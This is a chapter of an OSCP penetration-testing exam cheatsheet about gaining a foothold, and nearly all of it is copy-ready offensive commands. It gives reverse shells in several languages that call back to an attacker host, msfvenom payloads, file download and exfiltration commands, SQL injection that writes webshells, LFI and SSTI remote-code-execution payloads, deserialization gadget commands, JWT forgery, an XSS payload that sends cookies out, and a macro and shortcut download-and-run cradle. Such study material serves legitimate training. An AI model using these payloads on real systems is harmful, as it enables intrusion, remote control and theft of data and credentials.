# 02 · Foothold — Shells, Web & Exploits

> Part of the **OSCP/OSCP+ cheatsheet** — [← back to index](README.md)

---

## SHELLS, UPGRADES & FILE TRANSFER

### Reverse shell one-liners (set `LHOST`/`LPORT` first)
```bash
# Listener
nc -lvnp 443           # or: rlwrap nc -lvnp 443   (arrow keys/history)

# Bash
bash -i >& /dev/tcp/LHOST/443 0>&1
# alt (no /dev/tcp): 
exec 5<>/dev/tcp/LHOST/443; cat <&5 | while read l; do $l 2>&5 >&5; done

# sh / busybox
/bin/sh -i >& /dev/tcp/LHOST/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 443 >/tmp/f

# Python3
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("LHOST",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("LHOST",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="LHOST";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Powershell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```
- Generate/encode shells fast: **revshells.com** (memorize the format; can't browse during exam unless you cache it). msfvenom equivalents below.
- **Shell fires but never connects back?** Suspect egress filtering on the target — outbound is often restricted to a few ports. Before assuming the RCE failed, retry your listener on **80 / 443 / 53** (almost always allowed out). Same applies to staging downloads: host your payload on `:80`/`:443`.

### Stabilize a Linux TTY (do this immediately)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
# then:
export TERM=xterm
# background w/ Ctrl+Z, then on YOUR box:
stty raw -echo; fg
# (press Enter twice). Now you have arrows, tab, Ctrl+C.
# size it right:
stty size            # on your box -> get rows/cols
stty rows 50 cols 200   # in the shell
```

### Fully-interactive Windows shell (ConPtyShell — the Windows `stty` trick)
Upgrade a dumb Windows shell to a real PTY (tab, history, working Ctrl-C):
```bash
# On your box: raw the terminal so keystrokes pass through, note your size, then listen
stty raw -echo; (stty size)          # -> e.g. 50 200
nc -lvnp 443
```
```powershell
# On target (from the initial dumb shell):
IEX(IWR http://LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST 443 200 50
# reset your terminal afterwards:  stty sane / reset
```

### msfvenom payloads (NOT counted as Metasploit usage)
```bash
# Windows exe reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=L LPORT=443 -f exe -o rev.exe
# Windows staged meterpreter (only if this is your one MSF box)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=L LPORT=443 -f exe -o met.exe
# Linux elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=L LPORT=443 -f elf -o rev.elf
# War (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=L LPORT=443 -f war -o shell.war
# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=L LPORT=443 -f aspx -o shell.aspx
# PHP (strip the leading comment / add <?php)
msfvenom -p php/reverse_php LHOST=L LPORT=443 -f raw -o shell.php
# DLL / MSI / shellcode-as-needed: -f dll | msi | raw
```

### File transfer
```bash
# --- Serve from attacker ---
python3 -m http.server 80
impacket-smbserver share . -smb2support            # add -user x -password y if needed
# Windows-friendly SMB (NTLMv1 fallback older boxes):
impacket-smbserver share $(pwd) -smb2support

# --- Linux target pulls ---
wget http://LHOST/file -O /tmp/file
curl http://LHOST/file -o /tmp/file
# no wget/curl:
exec 3<>/dev/tcp/LHOST/80; echo -e "GET /file HTTP/1.0\r\n\r" >&3; cat <&3

# --- Windows target pulls ---
certutil -urlcache -split -f http://LHOST/file.exe file.exe
powershell -c "iwr http://LHOST/file.exe -OutFile file.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/f.exe','f.exe')"
copy \\LHOST\share\file.exe .        # from impacket-smbserver
# exfil a file from Windows back to you:
powershell -c "(New-Object Net.WebClient).UploadFile('http://LHOST/up','f')"   # need a receiver
# or read it over SMB share you host (target writes to \\LHOST\share\)
```

---

## WEB EXPLOITATION

### SQL injection
```sql
-- Detect: ' " `  )  --  #  ;   | observe errors / changed behavior
' OR 1=1-- -            -- auth bypass (also: admin'-- - / admin' #)
" OR ""="                -- string ctx
-- Find column count
' ORDER BY 5-- -         -- bump until error
' UNION SELECT NULL,NULL,NULL-- -   -- match count, find printable cols
-- MySQL data
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(user,0x3a,password),3 FROM users-- -
-- MySQL file read/write (RCE)
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/sh.php'-- -
-- MSSQL stacked + RCE
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';-- -
```
```bash
# sqlmap is BANNED on the exam (automatic exploitation tool). Do SQLi MANUALLY there.
# For OFF-EXAM practice only, to learn what a vuln looks like:
#   sqlmap -r req.txt --batch --dbs   /   --dump   (never on the real exam)
```
Blind: `' AND 1=1-- -` vs `' AND 1=2-- -`; time: `' AND SLEEP(5)-- -` / `WAITFOR DELAY '0:0:5'`.

### LFI / RFI / path traversal
```bash
# Basic
http://$IP/page.php?file=../../../../etc/passwd
# Double / nested traversal bypass (Trick box pattern)
....//....//....//etc/passwd        # strips "../" once
%2e%2e%2f  / %252e (double url-encode)
# PHP wrappers
php://filter/convert.base64-encode/resource=index.php     # leak source
php://filter/read=string.rot13/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==   # data: RCE
expect://id                                                     # if expect ext
# Log poisoning -> RCE (inject PHP into User-Agent, then include the log)
curl http://$IP/ -A "<?php system(\$_GET['c']); ?>"
?file=/var/log/apache2/access.log&c=id
# PHP FILTER CHAIN -> RCE (no log/upload needed; great when only LFI exists - Dante pattern)
#   github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
#   paste the produced php://filter/... blob as the include value, then &c=id
# Other read targets: /proc/self/environ, ssh keys (/home/u/.ssh/id_rsa),
#   /var/www/html/config.php, web.config, /etc/shadow, history files
```
Windows LFI: `..\..\..\Windows\System32\drivers\etc\hosts`, `C:\inetpub\wwwroot\web.config`.

### File upload bypass → webshell
- Extension tricks: `shell.php.jpg`, `shell.pHp`, `shell.php5/.phtml/.phar`, **trailing dot** `shell.php.` (Environment box pattern), null byte `shell.php%00.jpg` (old PHP), double ext.
- Content-Type spoof: set `Content-Type: image/png` but PHP body.
- Magic bytes: prepend `GIF89a;` then `<?php system($_GET['c']);?>`.
- `.htaccess` upload to map a new ext to PHP: `AddType application/x-httpd-php .xyz`.
- ASP/ASPX/JSP equivalents for Windows/Tomcat; `.war` for Tomcat manager.
- Find the upload path with feroxbuster, then `?c=id`.

### Command injection
```bash
; id        | id        || id        & id        && id
$(id)       `id`        %0a id (newline)
# blind: ping yourself / curl yourself / sleep
; ping -c3 LHOST     ; curl http://LHOST/$(whoami)     ; sleep 5
# filtered space: ${IFS} or {cat,/etc/passwd} or <
cat${IFS}/etc/passwd
```

### NoSQL injection (Mongo-backed apps)
```
# Auth bypass — JSON body:  {"user":{"$ne":null},"pass":{"$ne":null}}
# URL params:               user[$ne]=x&pass[$ne]=x   |   user[$regex]=^admin
# Blind exfil, char by char: pass[$regex]=^a  ->  ^ab  ->  ...
# JS eval sinks: '"><script> or  ';return true;var _='   (operator/$where injection)
```

### GraphQL
```bash
# Introspection is often left on — dump the whole schema:
curl -s http://$IP/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
# Then query hidden types/fields; resolvers frequently skip authz -> IDOR / data leak.
# Also check /graphiql, /v1/graphql, batch queries (send an array of ops).
```

### Path / auth-filter bypass quickies
- **Tomcat/Spring** path filter bypass: `..;/` segment — `/app/..;/manager/html`, `/;/admin`.
- **Nginx alias traversal:** `location /x` mapped to `alias /y/` → `/x../` escapes the dir.
- **`../` filtered:** try `%2e%2e%2f`, `..%2f`, `....//`, or double-encode `%252e%252e%252f`.
- **Reverse-proxy trust:** spoof `X-Forwarded-For: 127.0.0.1` / `X-Original-URL` / `X-Rewrite-URL` to reach admin-only paths.

### SSRF (DevArea / Apache CXF pattern)
- Hit internal services: `http://127.0.0.1:port`, cloud metadata `http://169.254.169.254/...`.
- Bypass filters: `http://127.1`, `http://0`, decimal/hex IP, `http://localhost`, DNS rebinding, `@` tricks `http://allowed@127.0.0.1`.
- Chain to internal admin panels / Redis / unauth APIs.

### XXE
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
<!-- OOB / blind: pull external DTD from your http server; PHP filter to base64 large files -->
```

### Common app footholds (searchsploit the exact version)
- **WordPress:** vuln plugins, `wp-config.php` creds, admin → theme editor → PHP RCE, xmlrpc password attack.
- **Tomcat:** `/manager/html` default creds (`tomcat:tomcat`, `admin:admin`) → deploy `.war`.
- **Jenkins:** `/script` Groovy console → RCE (Jeeves pattern). `Runtime.getRuntime().exec(...)`.
- **Git exposed:** `.git/` → `git-dumper` → source/creds.
- **Default creds everywhere** — try before exploiting.

---

### Server-Side Template Injection (SSTI)
```bash
# Detect: inject and look for evaluation -> "49"
{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   ${{7*7}}   *{7*7}
# Polyglot to fingerprint engine: ${{<%[%'"}}%\
# Jinja2 (Python/Flask) RCE:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
# Twig (PHP):
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
# Freemarker (Java):
<#assign ex='freemarker.template.utility.Execute'?new()>${ ex('id') }
# Ruby ERB:  <%= `id` %>      Velocity / Smarty also vuln
# tplmap = semi-automated (allowed; manual preferred). Base64-wrap cmds to dodge filters.
```

### Insecure deserialization
```bash
# Java (ysoserial) - blobs: base64 starts "rO0AB", hex "ac ed 00 05"
java -jar ysoserial.jar CommonsCollections5 'curl http://LHOST/x' | base64 -w0
#   gadgets: URLDNS (detect/blind), CommonsCollections1-7, Groovy1, Spring1
# .NET (ysoserial.net) - __VIEWSTATE, BinaryFormatter, Json.NET, Losformatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
#   ViewState w/ leaked machineKey (Hercules pattern):
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --generator=<__VIEWSTATEGENERATOR> --validationkey=<KEY> --validationalg=<ALG> -c "cmd /c whoami"
# PHP object injection (unserialize + magic methods __wakeup/__destruct):
phpggc Symfony/RCE4 system id          # generate gadget chain
# Python pickle (vulnerable loads()):
python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type("E",(),{"__reduce__":lambda s:(os.system,("id",))})())) )'
```

### JWT (JSON Web Token) attacks
```bash
# Decode offline: echo <part> | base64 -d   (or jwt.io offline)
# alg:none bypass -> set header {"alg":"none"}, drop signature but KEEP trailing dot
# Weak HMAC secret -> crack then re-sign:
hashcat -m 16500 jwt.txt rockyou.txt
# RS256->HS256 confusion: sign with server's PUBLIC key bytes as the HMAC secret
# jwt_tool does all of it:
python3 jwt_tool.py <JWT> -X a                 # alg:none
python3 jwt_tool.py <JWT> -C -d rockyou.txt    # crack secret
python3 jwt_tool.py <JWT> -T                   # tamper/re-sign
```

### Client-side / auth-flow (lower OSCP priority, but seen — Eloquia pattern)
```bash
# Stored XSS via SVG upload -> steal admin cookie:
<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('http://LHOST/?c='+document.cookie)</script></svg>
# OAuth/SAML CSRF, open-redirect chained to token theft
# IDOR / broken access control: change id params, hit endpoints without auth, mass-assignment (Facts pattern)
# PEN-200 client-side delivery (when a box expects a user to "open" something):
#   - VBA macro in .doc/.docm with a powershell reverse shell (macro_reverse_shell)
#   - config.Library-ms + .lnk over WebDAV: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
#     .lnk runs: powershell IEX(New-Object Net.WebClient).DownloadString('http://LHOST/p.ps1')
#   - deliver via swaks (see SMTP). Listener: nc -lvnp 443
```

---

## PUBLIC EXPLOITS (searchsploit workflow)
```bash
searchsploit apache 2.4
searchsploit -m 50383            # copy exploit to cwd
searchsploit -x 50383            # read it
# ALWAYS read the exploit before running. Fix: RHOST/LHOST, target offsets, python2->3,
# shellcode, hardcoded paths. Compile C exploits ON the target arch if possible:
gcc exploit.c -o exploit         # or cross-compile / use musl-gcc for static
# Windows precompiled privesc binaries: keep a local stash (PrintSpoofer, GodPotato, etc.)
```
### Compiling exploits
```bash
# Windows privesc exploit (C) compiled on Kali with mingw:
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe                 # 64-bit
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32          # 32-bit + winsock
# Static Linux binary (target missing shared libs):
gcc -static exploit.c -o exploit          # or: musl-gcc -static exploit.c -o exploit
gcc -m32 exploit.c -o exploit             # 32-bit on 64-bit Kali (needs gcc-multilib)
# Old python2 PoC on modern Kali: run with python2.7, or port print()/sockets to py3
# ALWAYS read & adjust offsets/RHOST/LHOST/shellcode before running.
```

Cache offline before the exam: exploit-db, GitHub PoCs, HackTricks, GTFOBins, LOLBAS, PayloadsAllTheThings.

---
